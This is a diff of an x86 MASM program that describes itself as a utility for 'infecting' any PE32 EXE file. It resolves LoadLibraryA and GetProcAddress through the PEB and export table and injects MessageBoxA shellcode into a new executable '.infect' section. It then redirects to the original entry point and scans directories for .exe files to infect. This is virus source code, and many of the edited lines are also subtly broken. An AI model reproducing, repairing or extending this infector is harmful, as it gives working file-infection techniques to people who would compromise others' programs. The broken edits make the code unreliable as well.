@@ -22,6 +22,7 @@
     lea eax, [pNtHeader + SIZEOF IMAGE_NT_HEADERS]
   ENDM
   .data 
+
     fileArg db "-f", 0
     directoryArg db "-d", 0
     usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
@@ -33,6 +34,7 @@
   .code
   
 start:
+  assume fs:nothing
   call main
   exit
 
@@ -151,10 +153,13 @@ GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
 GetEntryPoint ENDP
 
 InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD
-  LOCAL start_address:DWORD
-  LOCAL end:DWORD
+  LOCAL pSectionHeader:DWORD
   LOCAL lastSection:DWORD
   LOCAL OEP:DWORD
+  LOCAL start1: DWORD
+  LOCAL end1: DWORD
+  LOCAL endLabel: DWORD
+  LOCAL address: DWORD
   ; Get the first and last section
   mov eax, [pNtHeader]
   add eax, sizeof IMAGE_NT_HEADERS
@@ -186,47 +191,70 @@ InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, by
   invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
 
   ; Obtain the opcodes
-  lea eax, _loc1
-  mov ebx, dword ptr [start_address]
+  lea ebx, _loc1
+  mov eax, start1
   mov [ebx], eax
   jmp _over
 _loc1:
   mov eax, dword ptr fs:[30h]
-  mov eax, dword ptr [eax + 0Ch] ; PEB
-  mov eax, dword ptr [eax + 0Ch] ; Ldr
-  mov eax, dword ptr [eax + 14h] ; InInitializationOrderModuleList
+  add eax, 0Ch
+  mov eax, dword ptr [eax] ; PEB
+  sub eax, 0Ch
+
+  add eax, 0Ch
+  mov eax, dword ptr [eax] ; Ldr
+  sub eax, 0Ch
+
+  add eax, 14h
+  mov eax, dword ptr [eax] ; InInitializationOrderModuleList
+  sub eax, 14h
+
   mov eax, dword ptr [eax] ; First module
   mov eax, dword ptr [eax] ; Second module
-  mov eax, dword ptr [eax + 10h] ; Base address
 
-  mov ebx, dword ptr [start]; Take the base address of kernel32
-  mov eax, dword ptr [ebx + 0x3c]; PE header VMA
-  mov edi, dword ptr [ebx + eax + 0x78]; Export table relative offset
-  add edi, ebx; Export table VMA
-  mov ecx, dword ptr [edi + 0x18]; Number of names
+  add eax, 10h
+  mov eax, dword ptr [eax] ; Base address
+  sub eax, 10h
 
-  mov edx, dword ptr [edi + 0x20]; Names table relative offset
+  mov ebx, dword ptr [start1]; Take the base address of kernel32
+  mov eax, 3ch; PE header VMA
+  mov edi, dword ptr [ebx]; Export table relative offset
+  sub ebx, 3ch
+
+  add ebx, eax
+  add ebx, 78h; Export table VMA
+  mov edi, dword ptr [ebx]; Number of names
+  sub ebx, edi
+  sub ebx, 78h
+
+  add edi, 18h; Names table relative offset
+  mov ecx, dword ptr [edi]; Number of names
+  sub edi, 18h
+
+  add edi, 20h; Names table VMA
+  mov edx, dword ptr [edi]; Names table relative offset
   add edx, ebx; Names table VMA
+  sub edi, 20h
 
 _LLA :
   dec ecx
   mov esi, [edx + ecx * 4]; Store the relative offset of the name
   add esi, ebx; Set esi to the VMA of the current name
-  cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
+  cmp dword ptr[esi], 64616f4ch; backwards order of bytes L(4c)o(6f)a(61)d(64)
   je _LLALOOP1
 
 _LLALOOP1 :
-  cmp dword ptr[esi + 4], 0x7262694c ;L(4c)i(69)b(62)r(72)
+  cmp dword ptr[esi + 4], 7262694ch ;L(4c)i(69)b(62)r(72)
   je _LLALOOP2
 _LLALOOP2 :
-  cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
-  je stop; if its = then jump to stop because we found it
+  cmp dword ptr[esi + 8], 41797261h; third dword = a(61)r(72)y(79)A(41)
+  je _stop; if its = then jump to stop because we found it
   jmp _LLA; Load Libr aryA
 _stop :
-  mov edx, [edi + 0x24]; Table of ordinals relative
+  mov edx, [edi + 24h]; Table of ordinals relative
   add edx, ebx; Table of ordinals
   mov cx, [edx + 2 * ecx]; function ordinal
-  mov edx, [edi + 0x1c]; Address table relative offset
+  mov edx, [edi + 1ch]; Address table relative offset
   add edx, ebx; Table address
   mov eax, [edx + 4 * ecx]; ordinal offset
   add eax, ebx; Function VMA
@@ -234,17 +262,17 @@ _stop :
 
   sub esp, 11
   mov ebx, esp
-  mov byte ptr[ebx], 0x75; u
-  mov byte ptr[ebx + 1], 0x73; s
-  mov byte ptr[ebx + 2], 0x65; e
-  mov byte ptr[ebx + 3], 0x72; r
-  mov byte ptr[ebx + 4], 0x33; 3
-  mov byte ptr[ebx + 5], 0x32; 2
-  mov byte ptr[ebx + 6], 0x2e; .
-  mov byte ptr[ebx + 7], 0x64; d
-  mov byte ptr[ebx + 8], 0x6c; l
-  mov byte ptr[ebx + 9], 0x6c; l
-  mov byte ptr[ebx + 10], 0x0
+  mov byte ptr[ebx], 75h; u
+  mov byte ptr[ebx + 1], 73h; s
+  mov byte ptr[ebx + 2], 65h; e
+  mov byte ptr[ebx + 3], 72h; r
+  mov byte ptr[ebx + 4], 33h; 3
+  mov byte ptr[ebx + 5], 32h; 2
+  mov byte ptr[ebx + 6], 2eh; .
+  mov byte ptr[ebx + 7], 64h; d
+  mov byte ptr[ebx + 8], 6ch; l
+  mov byte ptr[ebx + 9], 6ch; l
+  mov byte ptr[ebx + 10], 0h
 
   push ebx
 
@@ -254,39 +282,39 @@ _stop :
 
 
   mov eax, fs:[30h]
-  mov eax, [eax + 0x0c]; 12
-  mov eax, [eax + 0x14]; 20
+  mov eax, [eax + 0ch]; 12
+  mov eax, [eax + 14h]; 20
   mov eax, [eax]
   mov eax, [eax]
-  mov eax, [eax + 0x10]; 16
+  mov eax, [eax + 10h]; 16
 
   mov ebx, eax; Take the base address of kernel32
-  mov eax, [ebx + 0x3c]; PE header VMA
-  mov edi, [ebx + eax + 0x78]; Export table relative offset
+  mov eax, [ebx + 3ch]; PE header VMA
+  mov edi, [ebx + eax + 78h]; Export table relative offset
   add edi, ebx; Export table VMA
-  mov ecx, [edi + 0x18]; Number of names
+  mov ecx, [edi + 18h]; Number of names
 
-  mov edx, [edi + 0x20]; Names table relative offset
+  mov edx, [edi + 20h]; Names table relative offset
   add edx, ebx; Names table VMA
 _GPA :
   dec ecx
   mov esi, [edx + ecx * 4]; Store the relative offset of the name
   add esi, ebx; Set esi to the VMA of the current name
-  cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
+  cmp dword ptr[esi], 50746547h; backwards order of bytes G(47)e(65)t(74)P(50)
   je _GPALOOP1
 
 _GPALOOP1 :
-  cmp dword ptr[esi + 4], 0x41636f72;  r(72)o(6f)c(63)A(41)
+  cmp dword ptr[esi + 4], 41636f72h;  r(72)o(6f)c(63)A(41)
   je _GPALOOP2
 _GPALOOP2 :
-  cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
+  cmp dword ptr[esi + 8], 65726464h; third dword = d(64)d(64)r(72)e(65)
   je _stp; if its = then jump to stop because we found it
   jmp _GPA
 _stp :
-  mov   edx, [edi + 0x24]; Table of ordinals relative
+  mov   edx, [edi + 24h]; Table of ordinals relative
   add   edx, ebx; Table of ordinals
   mov   cx, [edx + 2 * ecx]; function ordinal
-  mov   edx, [edi + 0x1c]; Address table relative offset
+  mov   edx, [edi + 1ch]; Address table relative offset
   add   edx, ebx; Table address
   mov   eax, [edx + 4 * ecx]; ordinal offset
   add   eax, ebx; Function VMA 
@@ -295,18 +323,18 @@ _stp :
 
   sub esp, 12
   mov ebx, esp
-  mov byte ptr[ebx], 0x4d; M
-  mov byte ptr[ebx + 1], 0x65 ;e
-  mov byte ptr[ebx + 2], 0x73 ;s
-  mov byte ptr[ebx + 3], 0x73 ;s
-  mov byte ptr[ebx + 4], 0x61 ;a
-  mov byte ptr[ebx + 5], 0x67 ;g
-  mov byte ptr[ebx + 6], 0x65 ;e
-  mov byte ptr[ebx + 7], 0x42 ;B
-  mov byte ptr[ebx + 8], 0x6f ;o
-  mov byte ptr[ebx + 9], 0x78 ; x
-  mov byte ptr[ebx + 10], 0x41 ;A
-  mov byte ptr[ebx + 11], 0x0
+  mov byte ptr[ebx], 4dh; M
+  mov byte ptr[ebx + 1], 65h ;e
+  mov byte ptr[ebx + 2], 73h ;s
+  mov byte ptr[ebx + 3], 73h ;s
+  mov byte ptr[ebx + 4], 61h ;a
+  mov byte ptr[ebx + 5], 67h ;g
+  mov byte ptr[ebx + 6], 65h ;e
+  mov byte ptr[ebx + 7], 42h ;B
+  mov byte ptr[ebx + 8], 6fh ;o
+  mov byte ptr[ebx + 9], 78h; x
+  mov byte ptr[ebx + 10], 41h ;A
+  mov byte ptr[ebx + 11], 0h
 
       ;;;;;;;;
          ; get back the value saved from LoadLibraryA return
@@ -341,7 +369,7 @@ _stp :
   call eax
   add esp, 8
 
-  mov eax, 0xdeadbeef ;Original Entry point
+  mov eax, 0deadbeefh ;Original Entry point
   jmp eax
 _over:
   mov eax, offset _loc2
@@ -349,16 +377,17 @@ _over:
 _loc2:
 
   ; Initialize variables
-  mov edi, offset address
-  mov esi, offset start
-  mov ecx, (endLabel - 11) - start
+  mov edi, address
+  mov esi, start1
+  sub ecx, ecx ; Clear ecx
+  sub ecx, start1 ; Subtract start1 from ecx
+  add ecx, endLabel ; Add endLabel to ecx
   xor edx, edx
-
 ; Loop over bytes
 _loop:
   ; Check for placeholder
   mov eax, [esi + edx]
-  cmp eax, 0xdeadbeef
+  cmp eax, 0deadbeefh
   jne _next
 
   ; Replace placeholder with OEP
@@ -384,7 +413,7 @@ _next:
   loop _loop
 
   ; Write to file
-  lea eax, lastSection.PointerToRawData
+  lea eax, [lastSection + 76]
   invoke SetFilePointer, hFile, eax, NULL, FILE_BEGIN
   lea eax, address
   lea ebx, bytesWritten
@@ -398,7 +427,16 @@ InfectSection endp
 
 CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
   ; Get the first section headerI
+  LOCAL infect[7]:BYTE
 
+  ; Initialize the infect string
+  mov byte ptr[infect], 105;      i
+  mov byte ptr[infect + 1], 110;  n
+  mov byte ptr[infect + 2], 102;  f
+  mov byte ptr[infect + 3], 101;  e
+  mov byte ptr[infect + 4], 99;   c
+  mov byte ptr[infect + 5], 116;  t
+  mov byte ptr[infect + 6], 0     ; null terminator
   IMAGE_FIRST_SECTION pNtHeader
   mov ebx, eax
 
@@ -408,13 +446,14 @@ CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD,
   movzx ecx, word ptr [eax]
 
   ; Section name
-  push ".infect"
+  lea eax, [infect]
   pop esi
 
   ; Check if the section already exists
   xor edx, edx
 _checkSection:
-  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
+  imul edx, edx, 40
+  mov eax, [ebx + edx] ; Offset of Name in IMAGE_SECTION_HEADER
   cmp eax, esi
   je _sectionExists
   inc edx
@@ -422,7 +461,8 @@ _checkSection:
   jl _checkSection
 
   ; Initialize the new section header
-  lea eax, [ebx + ecx * 40]
+  imul edx, edx, 40
+  lea eax, [ebx + ecx]
   push eax  ; Save the original value of eax
   push ecx  ; Save the original value of ecx
   mov ecx, 40  ; Set the count to 40
@@ -438,16 +478,30 @@ _checkSection:
   mov eax, [pNtHeader + 60]
   invoke GetAlign, sizeOfSection, eax, 0
   mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
-  mov edx, [ebx + (ecx - 1) * 40 + 8]
+  sub ecx, 1 ; Subtract 1 from ecx
+  imul ecx, ecx, 40 ; Multiply ecx by 40
+  add ecx, 8 ; Add 8 to ecx
+  mov edx, [ebx + ecx] ; Get the value at the effective address
   mov eax, [pNtHeader + 56]
-  mov edi, [ebx + (ecx - 1) * 40 + 12]
+
+  sub ecx, 1 ; Subtract 1 from ecx
+  imul ecx, ecx, 40 ; Multiply ecx by 40
+  add ecx, 12 ; Add 12 to ecx
+  mov edi, [ebx + ecx] ; Get the value at the effective address
+
   invoke GetAlign, edx, eax, edi
   mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
   invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
   mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
-  mov edx, [ebx + (ecx - 1) * 40 + 16]
+  sub ecx, 1 ; Subtract 1 from ecx
+  imul ecx, ecx, 40 ; Multiply ecx by 40
+  add ecx, 16 ; Add 16 to ecx
+  mov edx, [ebx + ecx] ; Get the value at the effective address
   mov eax, [pNtHeader + 56]
-  mov edi, [ebx + (ecx - 1) * 40 + 12]
+  sub ecx, 1 ; Subtract 1 from ecx
+  imul ecx, ecx, 40 ; Multiply ecx by 40
+  add ecx, 12 ; Add 12 to ecx
+  mov edi, [ebx + ecx] ; Get the value at the effective address
   invoke GetAlign, edx, eax, edi 
   mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
   mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER
@@ -555,13 +609,13 @@ OpenDirectory proc pathDirectory:DWORD
 
 
   ; Initialize exeExtension with "\*.exe\0"
-  mov byte ptr [ecx], 0x5C ; '\'
-  mov byte ptr [ecx+1], 0x2A ; '*'
-  mov byte ptr [ecx+2], 0x2E ; '.'
-  mov byte ptr [ecx+3], 0x65 ; 'e'
-  mov byte ptr [ecx+4], 0x78 ; 'x'
-  mov byte ptr [ecx+5], 0x65 ; 'e'
-  mov byte ptr [ecx+6], 0x00 ; null terminator
+  mov byte ptr [ecx], 5Ch ; '\'
+  mov byte ptr [ecx+1], 2Ah ; '*'
+  mov byte ptr [ecx+2], 2Eh ; '.'
+  mov byte ptr [ecx+3], 65h ; 'e'
+  mov byte ptr [ecx+4], 78h ; 'x'
+  mov byte ptr [ecx+5], 65h ; 'e'
+  mov byte ptr [ecx+6], 00h ; null terminator
 
   invoke lstrcpy, ebx, eax 
   invoke lstrcat, ebx, ecx 
